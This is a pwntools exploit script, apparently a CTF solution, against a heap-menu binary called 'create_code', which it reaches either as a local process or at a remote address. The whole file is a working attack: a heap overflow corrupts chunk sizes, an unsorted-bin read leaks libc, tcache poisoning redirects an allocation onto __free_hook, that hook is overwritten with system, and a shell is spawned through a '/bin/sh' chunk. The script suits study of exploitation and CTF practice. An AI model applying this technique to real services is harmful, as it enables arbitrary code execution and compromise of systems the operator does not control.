from pwn import  *

context(arch='amd64',endian='el',os='linux')
context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
context.log_level = 'debug'
debug = 1
if debug == 1:
  p = process("./create_code")
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
  p = remote("192.168.41.241",2007)
  libc = ELF("./libc.so.6",checksec=False)
#call_libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./create_code",checksec=False)

def cmd(cho):
  sla("> ",str(cho))

def add(content):
  cmd(1)
  sleep(0.02)
  sa("content: ",content)

def show(idx):
  cmd(2)
  sla("id: ",str(idx))

def free(idx):
  cmd(3)
  sla("id: ",str(idx))

def exit():
  cmd(4)
             	#add     1     2  3           4  5  6  7  8    
             	#free 1     2        3  4  5        6                    
add('a\n')   	# 0   -  4  3  3  3  2  1  1  1  1  -  4  4
add('a\n')   	# 1   0  0  -  4  4  3  2  -  3  3  2  2  2*
add('a\n')   	# 2   1  1  0  0 *0  0  -  -  -  4- 3  3  3
add('a\n')   	# 3   2  2  1  1  1  -  -  -  -  -  -  -  5
add('a\n')   	# 4   3  3  2  2  2  1  0  0  0  0  0  0  0 
#gdb.attach(p)	# 5              *5  4  3  2  2  2  1  1  1
free(0)
add('a'*0x320 + p64(0) + p64(0x661) ) # overwrite chunk0 size to 0x661 by heap overflow 
free(0)                               # free 0x661 chunk0 , free to unsorted bin
add('aaaaaaaa')                       # add chunk4 to cut unsorted bin ,last_remainder 0x330 chunk,it's fd/bk = main_arena+96
#gdb.attach(p)
show(0)			       # leak libc by main_arena+96 address
p.recvuntil("\x00\x00")
libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00')) -0x1ebbe0
# one = [0xe6c7e,0xe6c81,0xe6c84]
info("libc.address = " + hex(libc.address))
#gdb.attach(p)
add('a\n')                            # malloc chunk5 by unsorted bin 
free(1)                               # tcache attack 
free(0)
free(2)
#gdb.attach(p)                         #(0x330)   tcache_entry[49](3): 0x55d480c8d5d0 --> 0x55d480c8d900 --> 0x55d480c8dc30
add('a'*0x320 + p64(0) + p64(0x331) + p64(libc.sym['__free_hook']-0x10)) # overwrite chunk by heap overflow to modify fd to freehook-0x10
				       # (0x330)   tcache_entry[49](3): 0x55d480c8d900 --> 0x7fc407172b18
add('a\n')                            #(0x330)   tcache_entry[49](3): 0x7fc407172b18
free(1)                               #(0x330)   tcache_entry[49](3): 0x55d480c8d2a0 --> 0x7fc407172b18

add('a'*0x320 + p64(0) + p64(0x331) + "/bin/sh\x00"*4) # overwrite chunk2 fd = '/bin/sh'   tcache_entry[49](3):0x7fc407172b18
add('a'*0x10 + p64(libc.sym['system'])) # modify freehook to system
gdb.attach(p)
free(2)                               # free chunk2

ti()

